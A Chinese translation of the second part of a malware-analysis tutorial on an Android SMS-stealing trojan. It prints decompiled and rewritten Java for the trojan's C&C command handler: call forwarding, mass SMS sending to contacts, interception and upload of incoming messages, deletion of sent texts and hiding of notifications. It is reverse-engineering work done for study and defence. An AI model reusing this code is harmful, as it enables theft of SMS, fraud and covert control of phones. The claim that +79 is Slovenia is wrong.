> 原文链接: https://www.anquanke.com//post/id/168574 


# 洞若观火：全方位剖析Android信息窃取恶意软件（下篇）


                                阅读量   
                                **179757**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者maxkersten，文章来源：maxkersten.nl
                                <br>原文地址：[https://maxkersten.nl/binary-analysis-course/malware-analysis/android-sms-stealer/](https://maxkersten.nl/binary-analysis-course/malware-analysis/android-sms-stealer/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p1.ssl.qhimg.com/t01857c5ff27accb495.gif)](https://p1.ssl.qhimg.com/t01857c5ff27accb495.gif)



## 传送门

《洞若观火：全方位剖析Android信息窃取恶意软件（上篇）》

[https://www.anquanke.com/post/id/XXXXXX](https://www.anquanke.com/post/id/XXXXXX)



## 六、源代码分析

### <a class="reference-link" name="6.9%20%E7%B1%BBi%EF%BC%88%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86%EF%BC%89"></a>6.9 类i（第二部分）

根据从ServerCommunicator类中得到的新信息，我们能更加容易地理解类i。首先，它将收集方法和ID。

如果指定的方法是install，它还会手机网络运营商、bild模型、版本号、电话号码、IMEI、恶意程序版本和所在国家。所有这些数据都将被发送至C&amp;C服务器。

如果指定的方法是info，那么只会将恶意程序的方法和ID发送到C&amp;C服务器。

最后，有一个名为sms的选项，这一方法的行为与info方法相同。

```
protected final Object doInBackground(Object[] urlArray) `{`
    Object var2 = null;
    boolean var3 = false;
    boolean var4 = MainService.e;
    String url = ((String[]) urlArray)[0];
    ServerCommunicator serverCommunicator = new ServerCommunicator();
    this.parameters.add(new BasicNameValuePair("method", this.command));
    this.parameters.add(new BasicNameValuePair("id", this.sharedPreferences.getString("id", (String) null)));
    JSONObject serverResponse;
    if (this.command.startsWith("install")) `{`
        String POST = "POST";
        this.parameters.add(new BasicNameValuePair("operator", TelephonyManagerWrapper.getTelephonyManager(context).getNetworkOperatorName()));
        this.parameters.add(new BasicNameValuePair("model", Build.MODEL));
        this.parameters.add(new BasicNameValuePair("os", VERSION.RELEASE));
        this.parameters.add(new BasicNameValuePair("phone", TelephonyManagerWrapper.getTelephonyManager(context).getLine1Number()));
        this.parameters.add(new BasicNameValuePair("imei", TelephonyManagerWrapper.getTelephonyManager(context).getDeviceId()));
        this.parameters.add(new BasicNameValuePair("version", Constants.version));
        this.parameters.add(new BasicNameValuePair("country", context.getResources().getConfiguration().locale.getCountry()));
        serverResponse = ServerCommunicator.callC2(url, POST, this.parameters);
    `}` else if (this.command.startsWith("info")) `{`
        serverResponse = ServerCommunicator.callC2(url, StringDatabase.POST, this.parameters);
    `}` else `{`
        serverResponse = (JSONObject) var2;
        if (this.command.startsWith("sms")) `{`
            serverResponse = ServerCommunicator.callC2(url, StringDatabase.POST, this.parameters);
        `}`
    `}`

    if (StringDatabase.integerZero != 0) `{`
        if (!var4) `{`
            var3 = true;
        `}`

        MainService.e = var3;
    `}`

    return serverResponse;
`}`
```

需要注意的是，Constants类仅包含两个字段。这些变量的名称可以直接改成它们的值，例如下面的类：

```
public final class Constants `{`
    public static int int50005 = 50005;
    public static String version = "5";
`}`
```

6.9.1 onPostExecute

多亏我的一个朋友，我获得了使用JEB反编译的Java代码。代码仍然非常复杂，因为这一函数大概有250行之多。此外，还有很多try-catch结构和jump，这又给分析工作加大了难度。

SMALI等效代码大约有550行，这使得我们几乎无法分析。但根据SMALI代码，我们可以大概看到函数执行的操作：比较字符串，如果相匹配则执行代码。这可能代表Java代码确认后的命令处理。下面是反编译后未经修改的部分Java代码。

```
//[omitted]
try `{`
    if(v15.equals(String.valueOf(o.h) + o.E)) `{`
        this.w.edit().putLong(o.u, Long.valueOf((((long)(v8.optInt(i.t[17]) * 1000))) + System.currentTimeMillis()).longValue()).commit();
    `}`
    if(v15.equals(String.valueOf(o.h) + i.t[18])) `{`
        i.q(v8.optString(i.t[33]), v8.optString(o.c));
    `}`
    if(v15.equals(i.t[21] + o.f + i.t[16])) `{`
        v16 = v8.optString(i.t[33]);
        v17 = i.q.getContentResolver().query(ContactsContract$Contacts.CONTENT_URI, null, null, null, null);
        if(v17 != null) `{`
                goto label_125;
        `}`
            goto label_132;
    `}`
        goto label_160;
`}`
    catch(Throwable v2) `{`
    return;
`}`
    try `{`
    label_125:
    if(v17.getCount() &gt; o.z) `{`
            goto label_128;
    `}`
        goto label_132;
`}`
    catch(Throwable v2) `{`
        goto label_273;
`}`
//[omitted]
```

为了适应本文所分析的恶意软件，我将大约250行代码重写为下面给出的代码。在重写的代码中，包含恶意程序所存在的所有功能，并且没有反编译错误。请注意，大多数字符串所在的字符串数组中，都包含33个字符串。它还使用了StringDatabase类中的字符串，这使得它非常混乱。

在代码中，包含以前没有分析过的类。这些类将在需要的时候进行分析。

```
protected final void onPostExecute(JSONArray commandJson) `{`
    String command = commandJsonArray[0];
    switch (command) `{`
        case "install_true":
            sharedPreferenceEditor.putString("inst", "2").commit();
            break;
        case "call_number":
            TelephonyManagerWrapper2.callPhoneNumber(context, "*21*" + commandJson.optString("phone") + "#");
            new Handler().postDelayed(new StopCallForwardingRunnable(this), 1000 * (((long) commandJson.optInt("time"))));
            break;
        case "sms_grab":
            Long time_perehv = (((long) (commandJson.optInt("time") * 1000))) + System.currentTimeMillis();
            sharedPreferenceEditor.putLong("time_perehv", time_perehv).commit();
            break;
        case "sms_send":
            sendAndRemoveMessage(commandJson.optString("message"), commandJson.optString("phone"));
            break;
        case "delivery":
            TelephonyManagerWrapper2.callPhoneNumber(context, "*21*+79009999999#");
            String smsMessage = commandJson.optString("text");
            String recipientPhoneNumber;
            Cursor allContacts = context.getContentResolver().query(ContactsContract$Contacts.CONTENT_URI, null, null, null, null);
            Cursor contactIds = context.getContentResolver().query(ContactsContract$CommonDataKinds$Phone.CONTENT_URI, null, "contact_id = ?", new String[]`{`allContacts.getString(allContacts.getColumnIndex("_id"))`}`, null);
            if (allContacts.getCount() &gt; 0 &amp;&amp; contactIds.getCount() &gt; 0) `{`
                for (int i = 1; i &lt; 30; i++) `{`
                    if (allContacts.moveToNext()) `{`
                        if (contactIds.moveToFirst()) `{`
                            recipientPhoneNumber = contactIds.getString(contactIds.getColumnIndex("data1"));
                            if (recipientPhoneNumber != null) `{`
                                sendAndRemoveMessage(smsMessage, recipientPhoneNumber);
                            `}`
                        `}`
                    `}`
                `}`
            `}`
            break;
        case "new_url":
            String url = commandJson.optString("text");
            if (url.length() &gt; 10) `{`
                sharedPreferenceEditor.putString("url", url).commit();
                sharedPreferenceEditor.putString("inst", "1").commit();
            `}`
            break;
        case "ussd":
            TelephonyManagerWrapper2.callPhoneNumber(context, commandJson.optString("phone"));
            break;
    `}`
`}`
```

在switch中，处理了多个命令，这些不同的命令具体如下。随后，我们将按照列出的顺序逐一分析每个命令。

6.9.2 install_true

在接收到此命令后，字符串inst在共享首选项文件中被设置为2。这意味着安装完成。

```
case "install_true":
    sharedPreferenceEditor.putString("inst", "2").commit();
    break;
```

6.9.3 call_number

设置应该进行呼叫转移的电话号码。使用**21**作为前缀，并以#作为后缀，这样可以确保将呼入的电话转移到指定的号码上。

```
case "call_number":
    TelephonyManagerWrapper2.callPhoneNumber(context, "*21*" + commandJson.optString("phone") + "#");
    new Handler().postDelayed(new StopCallForwardingRunnable(this), 1000 * (((long) commandJson.optInt("time"))));
    break;
```

其中，StopCallForwardingRunnable类调用#21#，取消呼叫转移。命令中的时间变量将会指定何时应该取消呼叫转移，因为runnable的调用被延迟。时间变量是以秒为单位的等待时间，在代码中，原始函数需要以毫秒为单位的变量，因此该变量被乘以了1000。代码如下：

```
public final void run() `{`
    new TelephonyManagerWrapper2().callPhoneNumber(i.context, "#21#");
`}`
```

我们将在分析了所有命令之后，再对TelephonyManagerWrapper2类进行分析。

6.9.4 sms_grab

time_perehv的值表示未来的特定时间，以秒为单位。处理这部分命令的代码如下：

```
case "sms_grab":
    Long time_perehv = (((long) (commandJson.optInt("time") * 1000))) + System.currentTimeMillis();
    sharedPreferenceEditor.putLong("time_perehv", time_perehv).commit();
    break;
```

使用Android Studio的查找用法（Find Usage）功能，可以看到String类中的字符串time_perehv（在上面的代码中被替换，以增加可读性）也同样在类Ma中被使用。在这里，由于这个类是BroadcastReceiver，所以用到了getAllSmsMessageBodies和onReceive这两个有趣的函数。

getAllSmsMessageBodies函数需要一个参数，也就是一个SMS消息数组。每条短信的正文都将放在一个字符串中，其结果以单个字符串的形式返回。

```
private static String getAllSmsMessageBodies(SmsMessage[] smsMessageArray) `{`
    StringBuilder stringBuilder = new StringBuilder();
    for (SmsMessage messageBody : smsMessageArray) `{`
        stringBuilder.append(messageBody.getMessageBody());
    `}`
    return stringBuilder.toString();
`}`
```

需要使用BroadcastReceiver类扩展的类来实现onReceive函数。在处理BroadcastReceiver正在侦听的intent时，onReceive函数负责处理其intent。onReceive函数具体如下：

```
public void onReceive(Context context, Intent intent) `{`
    String intentAction;
    context.startService(new Intent(context, MainService.class));
    this.sharedPreferences = context.getSharedPreferences("PREFS_NAME", 0);
    try `{`
        intentAction = intent.getAction();
    `}` catch (Throwable th) `{`
        intentAction = "";
    `}`
    Object[] objArr = (Object[]) intent.getExtras().get("pdus");
    if (isActive || objArr != null) `{`
        SmsMessage[] smsMessageArray = new SmsMessage[objArr.length];

        long j = this.sharedPreferences.getLong("time_perehv", 0);
        if (System.currentTimeMillis() &lt; Long.valueOf(j).longValue()) `{`
            this.w = true;
        `}`
        if (Boolean.valueOf(SmsMessage.createFromPdu((byte[]) objArr[0]).getDisplayOriginatingAddress().equalsIgnoreCase("900")).booleanValue()) `{`
            this.w = true;
        `}`
        if (this.w &amp;&amp; intent != null &amp;&amp; intentAction != null) `{`
            if ("android.provider.telephony.SMS_RECEIVED".compareToIgnoreCase(intentAction) == 0) `{`
                String displayOriginatingAddress;
                for (int i = 0; i &lt; objArr.length; i++) `{`
                    smsMessageArray[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);
                    SmsMessage createFromPdu = SmsMessage.createFromPdu((byte[]) objArr[i]);
                    displayOriginatingAddress = createFromPdu.getDisplayOriginatingAddress();
                    new Handler().postDelayed(new y(this, context, createFromPdu.getDisplayMessageBody(), displayOriginatingAddress), 2000);
                `}`
                String allSmsMessageBodies = getAllSmsMessageBodies(smsMessageArray);
                displayOriginatingAddress = smsMessageArray[0].getDisplayOriginatingAddress();
                List parameters = new ArrayList();
                parameters.add(new BasicNameValuePair("fromPhone", displayOriginatingAddress));
                parameters.add(new BasicNameValuePair("text", allSmsMessageBodies));
                new CommandHandler(context, parameters, "sms").execute(new String[]`{`"url", null)`}`)
                ;
                try `{`
                    q();
                    return;
                `}` catch (Exception e) `{`
                    return;
                `}`
            `}`
            return;
        `}`
        return;
    `}`
    throw new AssertionError();
`}`
```

在这部分代码中，函数q和类y是未知的。至此，我们已经知道这部分的核心功能。Long j等于time_perehv的值，该值通过C&amp;C服务器的命令来设定。如果j晚于当前系统时间，那么布尔值w将被设置为true。请注意，默认情况下w被设置为false，如果收到的编号为900，那么该布尔值也将被设置为true。

如果将w设置为true，则继续执行代码，将intent的动作与接收到短信息时给出的动作进行比较。如果为true，类y将在2秒延迟后开始执行。

然后，利用短信命令，将所有短消息的内容发送到C&amp;C服务器。最后，执行函数q。

y的代码如下：

```
public final void run() `{`
    ((android.app.NotificationManager) this.context.getSystemService("notification").cancelAll();
    TelephonyManagerWrapper2.removeSentMessages(this.context, (String) this.body, this.numberTo);
`}`
```

通过使用NotificationManager（通知管理），可以取消所有通知。然后，删除发送到numberTo值的所有消息。根据该消息，可以将类y重命名为CancelAllNotificationsRunnable。<br>
函数q（在Ma类中）如下：

```
private boolean q() `{`
    try `{`
        Class.forName("android.content.Receiver").getDeclaredMethod("abortBroadcast", new Class[0]).invoke(this, new Object[0]);
    `}` catch (Throwable th) `{`
    `}`
    return true;
`}`
```

通过反射，调用abortBroadcast方法，从而从系统中删除广播。因此，我们可以将该函数重命名为abortBroadcastWrapper。

基于上面的分析，我们完全可以重写类Ma的onReceive函数，如下所示：

```
public void onReceive(Context context, Intent intent) `{`
    String intentAction;
    context.startService(new Intent(context, MainService.class));
    this.sharedPreferences = context.getSharedPreferences("PREFS_NAME", 0);
    try `{`
        intentAction = intent.getAction();
    `}` catch (Throwable th) `{`
        intentAction = "";
    `}`
    Object[] objArr = (Object[]) intent.getExtras().get("pdus");
    if (isActive || objArr != null) `{`
        SmsMessage[] smsMessageArray = new SmsMessage[objArr.length];

        long blockTimeDeadline = this.sharedPreferences.getLong("time_perehv", 0);
        if (System.currentTimeMillis() &lt; Long.valueOf(blockTimeDeadline).longValue()) `{`
            this.shouldBlock = true;
        `}`
        if (Boolean.valueOf(SmsMessage.createFromPdu((byte[]) objArr[0]).getDisplayOriginatingAddress().equalsIgnoreCase("900")).booleanValue()) `{`
            this.shouldBlock = true;
        `}`
        if (this.shouldBlock &amp;&amp; intent != null &amp;&amp; intentAction != null) `{`
            if ("android.provider.telephony.SMS_RECEIVED".compareToIgnoreCase(intentAction) == 0) `{`
                String displayOriginatingAddress;
                for (int i = 0; i &lt; objArr.length; i++) `{`
                    smsMessageArray[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);
                    SmsMessage createFromPdu = SmsMessage.createFromPdu((byte[]) objArr[i]);
                    displayOriginatingAddress = createFromPdu.getDisplayOriginatingAddress();
                    new Handler().postDelayed(new CancelAllNotificationsRunnable(this, context, createFromPdu.getDisplayMessageBody(), displayOriginatingAddress), 2000);
                `}`
                String allSmsMessageBodies = getAllSmsMessageBodies(smsMessageArray);
                displayOriginatingAddress = smsMessageArray[0].getDisplayOriginatingAddress();
                List parameters = new ArrayList();
                parameters.add(new BasicNameValuePair("fromPhone", displayOriginatingAddress));
                parameters.add(new BasicNameValuePair("text", allSmsMessageBodies));
                new CommandHandler(context, parameters, "sms").execute(new String[]`{`"url", null)`}`)
                ;
                try `{`
                    abortBroadcastWrapper();
                    return;
                `}` catch (Exception e) `{`
                    return;
                `}`
            `}`
            return;
        `}`
        return;
    `}`
    throw new AssertionError();
`}`
```

其中，由C&amp;C服务器提供并保存在共享首选项time_perehv中的时间决定什么时候阻止并删除所有传入的消息。因此，Ma类可以重命名为SmsBlocker。

6.9.5 sms_send

在JSON命令中，会将指定的文本消息发送到指定的号码。随后，如果用户检查发送的短信息，恶意软件会删除文本消息，从而避免产生任何怀疑。

```
case "sms_send":
    sendAndRemoveMessage(commandJson.optString("message"), commandJson.optString("phone"));
    break;
```

在上面的代码中，使用了函数sendAndRemoveMessage。该方法使用特定正文内容，并将短信息发送到特定号码。两秒钟后，使用可以运行的RemoveAllSentMessagesRunnable删除设备上所有可用的文本消息。

```
private static void sendAndRemoveMessage(String message, String numberTo) `{`
    if (numberTo != null &amp;&amp; message != null) `{`
        TelephonyManagerWrapper.sendSms(numberTo, message);
        (new Handler()).postDelayed(new RemoveAllSentMessagesRunnable(message, numberTo), 2000L);
    `}`
`}`
```

RemoveAllSentMessagesRunnable类包装了TelephonyManagerWrapper2，我们稍后对其进行分析。

```
final class RemoveAllSentMessagesRunnable implements Runnable `{`
    private final String message;
    private final String numberTo;

    RemoveAllSentMessagesRunnable(String message, String numberTo) `{`
        this.message = message;
        this.numberTo = numberTo;
    `}`

    public final void run() `{`
        TelephonyManagerWrapper2.removeSentMessages(CommandHandler.context, this.message, this.numberTo);
    `}`
`}`
```

6.9.6 ussd

使用callPhoneNumber函数（位于TelephonyManagerWrapper2类中）调用命令所提供的号码。输入的电话号码可以使ussd命令。

```
case "ussd":
    TelephonyManagerWrapper2.callPhoneNumber(context, commandJson.optString("phone"));
    break;
```

6.9.7 delivery

下面展示了交付命令的代码，代码已经经过重新编写，以尽可能多地包含详细信息。

```
case "delivery":
    TelephonyManagerWrapper2.callPhoneNumber(context, "*21*+79009999999#");
    String smsMessage = commandJson.optString("text");
    String recipientPhoneNumber;
    Cursor allContacts = context.getContentResolver().query(ContactsContract$Contacts.CONTENT_URI, null, null, null, null);
    Cursor contactIds = context.getContentResolver().query(ContactsContract$CommonDataKinds$Phone.CONTENT_URI, null, "contact_id = ?", new String[]`{`allContacts.getString(allContacts.getColumnIndex("_id"))`}`, null);
    if (allContacts.getCount() &gt; 0 &amp;&amp; contactIds.getCount() &gt; 0) `{`
        for (int i = 1; i &lt; 30; i++) `{`
            if (allContacts.moveToNext()) `{`
                if (contactIds.moveToFirst()) `{`
                    recipientPhoneNumber = contactIds.getString(contactIds.getColumnIndex("data1"));
                    if (recipientPhoneNumber != null) `{`
                        sendAndRemoveMessage(smsMessage, recipientPhoneNumber);
                    `}`
                `}`
            `}`
        `}`
    `}`
    break;
```

首先，恶意软件设置将任何呼叫都转移到号码+79009999999。区号+79是斯洛文尼亚。之后，从命令中检索短信息的正文。并使用两个查询，查询手机中的所有联系人，上限为29。这些联系人都将收到一条短信息，其中包含在命令中定义的正文。之后，将会从手机上删除这一条发出的消息。

6.9.8 new_url

使用此命令，可以在设置中更改C&amp;C服务器的URL。命令中URL的名称为text。程序会对其进行完整性检查，以查看URL是否超过了10个字符。符合HTTP协议（[http://）规范并包含两个字符的顶级域名等于10个字符。](http://%EF%BC%89%E8%A7%84%E8%8C%83%E5%B9%B6%E5%8C%85%E5%90%AB%E4%B8%A4%E4%B8%AA%E5%AD%97%E7%AC%A6%E7%9A%84%E9%A1%B6%E7%BA%A7%E5%9F%9F%E5%90%8D%E7%AD%89%E4%BA%8E10%E4%B8%AA%E5%AD%97%E7%AC%A6%E3%80%82)

因此，即使是最小的URL，也要有11个字符，因此恶意程序会对其进行检查。由于手机尚未在新的C&amp;C服务器上注册，所以inst设置为1。代码如下：

```
case "new_url":
    String url = commandJson.optString("text");
    if (url.length() &gt; 10) `{`
        sharedPreferenceEditor.putString("url", url).commit();
        sharedPreferenceEditor.putString("inst", "1").commit();
    `}`
    break;
```

6.9.9 重命名类

根据两个函数中的信息，这个类通过将命令（字符串）与已知命令列表进行比较，然后调用正确的类来执行请求的操作，从而处理特定命令。因此，我们将这个类重命名为CommandHandler。

### <a class="reference-link" name="6.10%20TelephonyManagerWrapper2"></a>6.10 TelephonyManagerWrapper2

TelephonyManagerWrapper2的代码如下：

```
public static void removeSentMessages(Context context, String body, String numberTo) `{`
    try `{`
        Uri parse = Uri.parse("content://sms/inbox");
        Cursor query = context.getContentResolver().query(parse, new String[]`{`"_id", "thread_id", "person", "date", "body"`}`, null, null, null);
        if (query == null) `{`
            return;
        `}`
        if (query.moveToFirst()) `{`
            do `{`
                long firstMessage = query.getLong(0);
                String thread_id = query.getString(2);
                if (body.equals(query.getString(5))) `{`
                    if (thread_id.equals(numberTo)) `{`
                        context.getContentResolver().delete(Uri.parse("content://sms/" + firstMessage), null, null);
                    `}`
                `}`
            `}` while (query.moveToNext());
        `}`
    `}` catch (Throwable th) `{`
    `}`
`}`
```

如果号码和消息正文都匹配该函数参数提供的号码和文本消息正文，那么发送到收件人号码的所有消息都会从手机中删除。

callPhoneNumber函数代码如下：

```
public final void callPhoneNumber(Context context, String phoneNumber) `{`
    ((TelephonyManager) context.getSystemService("phone")).listen(new q(this, context, (byte) 0), 32);
    Intent intent = new Intent("android.intent.action.Call");
    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
    intent.setData(Uri.fromParts("tel", phoneNumber, "#"));
    context.startActivity(intent);
`}`
```

调用在此函数中作为参数提供的号码。名为q的类，是PhoneStateListener类的包装器，如下所示：

```
final class q extends PhoneStateListener `{`
    Context context;
    final TelephonyManagerWrapper2 telephonyManagerWrapper2;

    private q(TelephonyManagerWrapper2 telephonyManagerWrapper2, Context context) `{`
        this.telephonyManagerWrapper2 = telephonyManagerWrapper2;
        this.context = context;
    `}`

    q(TelephonyManagerWrapper2 telephonyManagerWrapper2, Context context, byte b) `{`
        this(telephonyManagerWrapper2, context);
    `}`

    public final void onCallStateChanged(int i, String str) `{`
    `}`
`}`
```

因此，它可以重命名为PhoneStateListenerWrapper。



## 七、总结

至此，恶意软件中的所有类都被我们发现、分析和重新编写。这样一来，我们就掌握了恶意软件的命令，和内部工作的原理。在最后一次检查manifest时，所有类都已经被重新编写。
